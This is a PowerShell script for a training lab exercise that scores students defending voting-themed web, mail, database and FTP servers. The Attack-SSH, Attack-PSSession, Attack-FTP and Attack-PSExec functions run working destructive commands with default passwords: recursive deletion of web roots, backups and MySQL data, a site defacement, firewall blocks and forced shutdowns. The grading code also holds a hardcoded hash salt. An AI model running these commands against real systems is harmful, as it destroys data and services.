#MATTHEW's SIMULATE ATTACK SCRIPT EXERCISE 7.1.042

#Global Variables
Write-Host Enter in Windows Local Administrator Username and Password
$admincred = Get-Credential -Message " Enter in Winows Local Administrator Username and Password "
Write-Host Enter in FTP Local Administrator Username and Password
$ftpcred = Get-Credential -Message " Enter in FTP Local Administrator Username and Password "


Import-Module C:\FTP\PSFTP.psm1
$username = 'Grading'
$password = 'P@ssw0rd'
$secureStringPwd = $password | ConvertTo-SecureString -AsPlainText -Force 
$cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $secureStringPwd


$username = 'DCI Student'
$password = 'P@ssw0rd'
$secureStringPwd = $password | ConvertTo-SecureString -AsPlainText -Force 
$defaultcred = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $secureStringPwd

$username = 'Administrator'
$password = 'P@ssw0rd'
$secureStringPwd = $password | ConvertTo-SecureString -AsPlainText -Force 
$defaultcred2 = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $secureStringPwd
$score = 100;


#HELPER FUNCTIONS

Function Get-StringHash([String] $String,$HashName = "MD5")
{
$StringBuilder = New-Object System.Text.StringBuilder
[System.Security.Cryptography.HashAlgorithm]::Create($HashName).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($String))|%{
[Void]$StringBuilder.Append($_.ToString("x2"))
}
$StringBuilder.ToString()
}

function Get-GradeHash(){

Get-StringHash ("$score" + "RMPCOOPERKRAEMER") "MD5"
}

function Get-Connected($ip) {

$job =  Invoke-Command -ComputerName $ip -Credential $cred  -ScriptBlock { Hostname } -AsJob 
$Job | Wait-Job -Timeout 3 | Out-Null
$Job | Stop-Job | Out-Null
$result = (Receive-Job $Job )
if(  $result.length -gt 1 ) {return 0} else { return -0.1}
}

function Get-ConnectedAdmin($ip) {

$job =  Invoke-Command -ComputerName $ip -Credential $admincred  -ScriptBlock { Hostname } -AsJob 
$Job | Wait-Job -Timeout 3 | Out-Null
$Job | Stop-Job | Out-Null
$result = (Receive-Job $Job )
if(  $result.length -gt 1 ) {return 0} else { return -0.1}
}
function Get-GradingSSH() {

$job = Start-Job -ScriptBlock{Invoke-Expression 'plink student@10.10.10.13 -pw P@ssw0rd whoami;exit'} 
$Job | Wait-Job -Timeout 3 | Out-Null
$Job | Stop-Job | Out-Null
$a = Receive-Job $Job 
if($a.length -gt 0 ) {return 0;} else { return -0.1 }
}

function Start-Timeout($command) {
$Job = Start-Job -ScriptBlock{Invoke-Expression $using:command } 
Sleep 3
return  Receive-Job $Job 

}

function Start-TimeoutLong($command) {
$Job = Start-Job -ScriptBlock{Invoke-Expression $using:command } 
Sleep 5
return  Receive-Job $Job 

}

#GRADING SCRIPTS - These functions are used for Grading by checking connectivity of services


function Check-GradingConnectivity(){
<# This script checks Connectivity of the Grading account for 10.10.10.10-10.10.13
It then returns -.1 for each device with connectivity
#>

$a = Get-Connected('10.10.10.10')
$b = Get-Connected('10.10.10.11')
$c = Get-Connected('10.10.10.12')
$d = Get-GradingSSH 
return ($a + $b + $c + $d); 

}

function Check-AdminConnectivity(){
<# This script checks Connectivity of the Admin account for 10.10.10.10-10.10.13
It then returns -.1 for each device with connectivity
#>

$a = Get-ConnectedAdmin('10.10.10.10')
$b = Get-ConnectedAdmin('10.10.10.11')
$c = Get-ConnectedAdmin('10.10.10.12')
return ($a + $b + $c ); 

}

function Check-Services(){
<# This script checks that all services are running and gives -.1 for each service not running 
#>
$a = -.4
$b = -.1
$c = -.1
$d = -.1
if( (Invoke-WebRequest 10.10.10.10 -TimeoutSec 1 -UseBasicParsing ) -match "Utopia" ) { $a = 0}
if ( Start-TimeOut("Test-NetConnection 10.10.10.12  -Port 25 -InformationLevel Quiet")  ) { $b = 0 }
if ( Start-Timeout("Test-NetConnection 10.10.10.12  -Port 110 -InformationLevel Quiet") ) { $c = 0 }
if ( Start-Timeout("Test-NetConnection 10.10.10.13  -Port 21 -InformationLevel Quiet") ) { $d = 0 }
return $a + $b + $c + $d
}

function Send-AdminEmail($body,$subject) {

$username = 'admin@votetoday.com'
$password = 'P@ssw0rd'
$secureStringPwd = $password | ConvertTo-SecureString -AsPlainText -Force 
$adminemail = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $secureStringPwd

Send-MailMessage -Body $body -Subject $subject -From admin@votetoday.com -SmtpServer votetoday.com -Credential $adminemail -To CPTDCI@votetoday.com 

}



function Attack-SSH(){
<#Connect to Kali and Execute it's attack script
Kali will attempt the following:
Connect to voting web server  via admin interface port 8000 and delete website
ssh into voting web server via user webmanagement and delete webite 
ssh into ftp backup and delete everything
#>

#Delete Website via port 8000 and ssh
plink root@10.10.10.104 -pw P@ssw0rd  cd /`; ./attackscript.sh
#Delete Entire Ftp backup
plink student@10.10.10.13 -pw P@ssw0rd  cd /`;echo P@ssw0rd ^`| sudo `-S rm `-f `-R *

plink webmanagement@10.10.10.10 -pw P@ssw0rd del C:\xampp\htdocs\* /F /Q;
plink webmanagement@10.10.10.10 -pw P@ssw0rd netsh advfirewall firewall add rule name=”allow80” protocol=TCP dir=out localport=80 action=block
Start-Timeout("plink webmanagement@10.10.10.10 -pw P@ssw0rd netsh advfirewall set allprofiles state on");
}

function Attack-PSSession(){
<# Windows Insider will Shutdown all windows computers still using default username and password

#>
Invoke-Command -ComputerName 10.10.10.10 -ScriptBlock { Stop-Computer -Force   } -Credential $defaultcred -AsJob | Out-Null
Invoke-Command -ComputerName 10.10.10.11 -ScriptBlock { Stop-Computer -Force   } -Credential $defaultcred -AsJob | Out-Null
Invoke-Command -ComputerName 10.10.10.12 -ScriptBlock { Stop-Computer -Force   } -Credential $defaultcred -AsJob | Out-Null
Invoke-Command -ComputerName 10.10.10.10 -ScriptBlock { Stop-Computer -Force   } -Credential $defaultcred2 -AsJob | Out-Null
Invoke-Command -ComputerName 10.10.10.11 -ScriptBlock { Stop-Computer -Force   } -Credential $defaultcred2 -AsJob | Out-Null
Invoke-Command -ComputerName 10.10.10.12 -ScriptBlock { Stop-Computer -Force   } -Credential $defaultcred2 -AsJob | Out-Null
}

function Attack-FTP() {

$username = 'Mike'
$password = 'P@ssw0rd'
$secureStringPwd = $password | ConvertTo-SecureString -AsPlainText -Force 
$mike = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $secureStringPwd
$username = 'Gabe'
$password = 'P@ssw0rd'
$secureStringPwd = $password | ConvertTo-SecureString -AsPlainText -Force 
$gabe = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $secureStringPwd
$username = 'student'
$password = 'P@ssw0rd'
$secureStringPwd = $password | ConvertTo-SecureString -AsPlainText -Force 
$student = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $secureStringPwd


Set-FTPConnection -Credentials $mike -Server 10.10.10.10 -Session MyTestSession -UsePassive
$session = Get-FtpConnection -Session MyTestSession
Remove-FtpItem -Session $session -Path xampp\htdocs\ -Recurse

Set-FTPConnection -Credentials $gabe -Server 10.10.10.11 -Session MyTestSession -UsePassive 
$session = Get-FtpConnection -Session MyTestSession
Remove-FtpItem -Session $session -Path xampp\mysql\ -Recurse

Set-FTPConnection -Credentials $student -Server 10.10.10.11 -Session MyTestSession -UsePassive 
$session = Get-FtpConnection -Session MyTestSession
Remove-FtpItem -Session $session -Path xampp\mysql\ -Recurse
}

function Attack-PSExec() { 
C:\psexec\PsExec64.exe \\10.10.10.10 -u Grading -p P@ssw0rd  powershell del C:\xampp\htdocs\index.php
C:\psexec\PsExec64.exe \\10.10.10.10 -u Grading -p P@ssw0rd  powershell Set-Content C:\xampp\htdocs\index.php -Value NOW THIS IS A HACK!
C:\psexec\PsExec64.exe \\10.10.10.11 -u Grading -p P@ssw0rd  powershell Stop-Service mysql
C:\psexec\PsExec64.exe \\10.10.10.11 -u Grading -p P@ssw0rd  powershell Get-ChildItem C:\xampp\mysql\data\mysql `| `% `{ del `$_.fullname `-Force `}
C:\psexec\PsExec64.exe \\10.10.10.12 -u Administrator -p P@ssw0rd  powershell Stop-Service hmailServer
C:\psexec\PsExec64.exe \\10.10.10.12 -u Administrator -p P@ssw0rd  powershell del C:\Windows\System32\drivers\etc\hosts
}



# START OF PROGRAM

#STARTING ATTACK SIMULATION

$x = 0
$score = 100;
Write-Host " Checking Connectivity of Local Administrator and Grading Account" -ForegroundColor Green -BackgroundColor Black 
$checkit = Check-AdminConnectivity
if($checkit -ne 0) { Write-Host "WARNING! Admin does not have connectivity to all boxes. Recommend Stopping Now!" -ForegroundColor Red }
$checkit =  Check-GradingConnectivity
if($checkit -ne 0) { Write-Host "Grading does not have access to all accounts. You either changed a password or username. Now exiting."; Exit; }
$checkit = Read-Host "Are you sure you want to begin voting and attack simulation? This attack will last 2 hours and you will need to interact, making sure to check your email.
 Enter y to start the simulation. Enter anything else to exit."
if($checkit -ne "y" ) { Exit; }



#StatupVoting Simulation
Start-Timeout("C:\psexec\PsExec64.exe \\10.10.40.100 -u Grading -p P@ssw0rd C:\votingsim.exe ")


#Send Starting Email
Send-AdminEmail -body "If you are seeing this email that means you sucessfully connected and your email is working! 
Congrats! It also means voting has begun! Please continue to check this email! We Just have to keep this network running for 2 hours, We can do this!" -subject "Voting has begun!"

while ( $x -lt 120 ) {

if ( ($x % 2) -eq 0) { 
$checkit = Check-Services ;
$score = $score + $checkit;
if($checkit -ne 0) {
Send-AdminEmail -body "I've been checking our services and some of them are down! Please fix this as soon as possible!" -subject "Services Down"

}
if($checkit -eq 0 ) {
$checkit = Check-AdminConnectivity;
$score = $score + $checkit;
if($checkit -ne 0) {
Send-AdminEmail -body "I don't have connectivity to boxes! Please fix this as soon as possible!" -subject "No Admin Connectivity"
}
}

if($checkit -eq 0 ) {
$checkit = Check-GradingConnectivity;
$score = $score + $checkit;
if($checkit -ne 0) {
Write-Host "Grading Account not accessible. Please do not change Grading Account username and password. Points have been deducted. " 
}
}


}


if( $x -eq 60) {
$adminscore = -5;
try {
#Admin Needs to Update Website Via FTP
$myrandom = Get-Random -Maximum 1000
echo $myrandom > localupdate.txt
Sleep 1
Set-FTPConnection -Credentials $ftpcred -Server 10.10.10.10 -Session MyTestSession -UsePassive 
$session = Get-FtpConnection -Session MyTestSession
Get-FTPChildItem -Session $Session -Path xampp\htdocs 
Get-ChildItem localupdate.txt | Add-FTPItem -Session $session -Path ftp://10.10.10.10/xampp/htdocs/  -Overwrite
#Admin Checks Update Via Powershell

$job =  Invoke-Command -ComputerName 10.10.10.10 -Credential $admincred  -ScriptBlock { Get-Content C:\xampp\htdocs\localupdate.txt } -AsJob 
$Job | Wait-Job -Timeout 2 | Out-Null
$Job | Stop-Job | Out-Null
$result = (Receive-Job $Job )
if(  $result -eq [string]$myrandom ) {$adminscore = 0}
if($adminscore -eq 0){Send-AdminEmail -body "Hey thanks for giving me the correct credentials, I was able to update the site via FTP!" -subject "Updated via FTP" }
else { Send-AdminEmail -body "Hey I tried updating the website via FTP and it didn't work! " -subject "Couldnt Update!"}
}
catch { }
$score = $score + $adminscore

}

if( $x -eq 10) {
Send-AdminEmail -body "Just saw a huge attempted attack on the network! Hopefully everything is ok! " -subject "Attack!"
Attack-PSSession;
}

if( $x -eq 30) {
Send-AdminEmail -body "Just saw a huge attempted attack on the network! Hopefully everything is ok! " -subject "Attack2!"
Attack-FTP;
}
if( $x -eq 70) {
Send-AdminEmail -body "Just saw a huge attempted attack on the network! Hopefully everything is ok! " -subject "Attack3!"
Attack-SSH
}
if( $x -eq 110) {
Send-AdminEmail -body "Just saw a huge attempted attack on the network! Hopefully everything is ok! " -subject "Attack4!"
Attack-PSExec
}



if( $x -eq 100) {
Send-AdminEmail -body "So...I accidentally deleted the website while updating it. Could you restore a backup to the voting server...that I hope you made?" -subject "Oooppsss" 
$job =  Invoke-Command -ComputerName 10.10.10.10 -Credential $admincred  -ScriptBlock { del C:\xampp\htdocs\ -Force -Recurse } -AsJob 
$Job | Wait-Job -Timeout 2 | Out-Null
$Job | Stop-Job | Out-Null
$result = (Receive-Job $Job )
}



Sleep 45
echo "Current Score:$score"
echo ("Approximate Time Left:" + (120-$x) + " Minutes");
$x = $x + 1;
}

$score = $score - ( $score % 5) + 5;
if( $score -lt 0) { $score = 0 }
$x = Get-GradeHash
"Score:"
$score
"Hash:"
$x 
$x > grade.txt
Read-Host "Enter anything to cleanup and quit. Make sure to record your hash value!!!!!!!!"
#cleanup
Get-Job | Stop-Job
Get-Job | Remove-Job
